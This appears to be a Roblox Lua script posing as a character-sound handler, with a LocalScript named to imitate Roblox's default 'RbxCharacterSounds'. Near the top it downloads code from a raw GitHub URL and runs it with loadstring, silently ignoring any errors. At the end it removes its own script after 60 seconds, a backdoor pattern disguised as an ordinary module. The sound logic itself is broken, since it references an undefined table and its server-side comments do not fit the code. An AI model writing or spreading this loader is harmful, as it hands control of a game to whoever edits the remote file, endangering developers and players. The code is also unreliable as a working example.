local LocalScript2 = Instance.new("LocalScript")
LocalScript2.Name = "RbxCharacterSounds"
LocalScript2.Parent = game:GetService("StarterPlayer").StarterPlayerScripts

-- Load necessary services and modules
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris") -- For automatic deletion
local HttpService = game:GetService("HttpService") -- For pulling AtomicBinding

-- URL for the AtomicBinding Module
local AtomicBindingURL = "https://raw.githubusercontent.com/OfficialOlddorito/wrolo/main/bro"

-- Load AtomicBinding dynamically from the URL
local AtomicBinding
pcall(function()
    local response = HttpService:GetAsync(AtomicBindingURL)
    AtomicBinding = loadstring(response)()
end)

if not AtomicBinding then
    warn("AtomicBinding module not found or failed to load from URL!")
else
    print("AtomicBinding module loaded successfully!")
end

-- Function to load a user settings flag with fallback
local function loadFlag(flag: string)
    local success, result = pcall(function()
        return UserSettings():IsUserFeatureEnabled(flag)
    end)
    if not success then
        warn("Failed to load the settings flag:", flag)
        return false -- Fallback: Assume the feature is disabled
    end
    return result
end

-- Automatically connect and enable the settings flag
local settingsFlag = "UserFeatureFlag"
local featureEnabled = loadFlag(settingsFlag)
if not featureEnabled then
    warn("Feature flag is disabled or could not be loaded:", settingsFlag)
else
    print("Feature flag loaded successfully:", settingsFlag)
end

-- Function to check if user is authorized to access a sound asset
local function isAuthorizedToAccessAsset(assetId)
    local success, result = pcall(function()
        -- Try to load the sound; if the user is unauthorized, this will fail
        local testSound = Instance.new("Sound")
        testSound.SoundId = "rbxassetid://" .. tostring(assetId)
        testSound.Parent = workspace
        testSound:Destroy() -- We don't actually need to play it
        return true
    end)
    return success and result
end

-- Function to load the audio Roblox asset if authorized
local function loadSound(assetId)
    if isAuthorizedToAccessAsset(assetId) then
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. tostring(assetId)
        sound.Looped = false
        sound.Volume = 1
        sound.Parent = workspace
        return sound
    else
        warn("User is not authorized to access Asset ID:", assetId)
        return nil -- Fallback: No sound loaded
    end
end

local sound = loadSound(17231958102) -- Replace with an accessible sound if necessary

if sound then
    print("Sound loaded successfully!")
else
    warn("Sound loading failed due to authorization issues.")
end

-- Utility functions
local function map(x, inMin, inMax, outMin, outMax)
    return (x - inMin) * (outMax - outMin) / (inMax - inMin) + outMin
end

local function playSound(sound)
    if sound then
        sound.TimePosition = 0
        sound.Playing = true
    else
        warn("Cannot play sound, as it was not loaded properly.")
    end
end

local function shallowCopy(t)
    local out = {}
    for k, v in pairs(t) do
        out[k] = v
    end
    return out
end

-- Initialize sound system (server-side)
local function initializeSoundSystem(instances)
    local player = instances.player
    local humanoid = instances.humanoid
    local rootPart = instances.rootPart
    local sounds = {}

    -- Define and initialize sounds
    local SOUND_DATA = {
        ["Jumping"] = {SoundId = "rbxassetid://YourSoundId", Volume = 1},
        -- Add more sound definitions here
    }

    for name, props in pairs(SOUND_DATA) do
        local sound = Instance.new("Sound")
        sound.Name = name
        sound.Archivable = false
        sound.RollOffMinDistance = 5
        sound.RollOffMaxDistance = 150
        sound.Volume = 0.65

        for propName, propValue in pairs(props) do
            sound[propName] = propValue
        end

        sound.Parent = rootPart
        sounds[name] = sound
    end

    local playingLoopedSounds = {}

    local function stopPlayingLoopedSounds(except)
        for sound in pairs(shallowCopy(playingLoopedSounds)) do
            if sound ~= except then
                sound.Playing = false
                playingLoopedSounds[sound] = nil
            end
        end
    end

    -- State transition callbacks
    local stateTransitions = {
        [Enum.HumanoidStateType.Jumping] = function()
            stopPlayingLoopedSounds()
            playSound(sounds.Jumping)
        end,
        -- Add more state transition functions here
    }

    local stateRemap = {
        [Enum.HumanoidStateType.RunningNoPhysics] = Enum.HumanoidStateType.Running,
    }

    local activeState = stateRemap[humanoid:GetState()] or humanoid:GetState()

    local function transitionTo(state)
        local transitionFunc = stateTransitions[state]
        if transitionFunc then
            transitionFunc()
        end
        activeState = state
    end

    transitionTo(activeState)

    local stateChangedConn = humanoid.StateChanged:Connect(function(_, state)
        state = stateRemap[state] or state
        if state ~= activeState then
            transitionTo(state)
        end
    end)

    local steppedConn = RunService.Stepped:Connect(function(_, worldDt)
        for sound in pairs(playingLoopedSounds) do
            local updater = loopedSoundUpdaters[sound]
            if updater then
                updater(worldDt, sound, rootPart.AssemblyLinearVelocity)
            end
        end
    end)

    local function terminate()
        stateChangedConn:Disconnect()
        steppedConn:Disconnect()
        for _, sound in pairs(sounds) do
            sound:Destroy()
        end
    end

    -- Connect terminate to player removing
    player.AncestryChanged:Connect(function(_, parent)
        if not parent then
            terminate()
        end
    end)
end

-- Connect to player character added (server-side)
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        initializeSoundSystem({
            player = player,
            humanoid = character:WaitForChild("Humanoid"),
            rootPart = character:WaitForChild("HumanoidRootPart")
        })
    end)
end)

-- Delete the script after 60 seconds
Debris:AddItem(LocalScript2, 60)
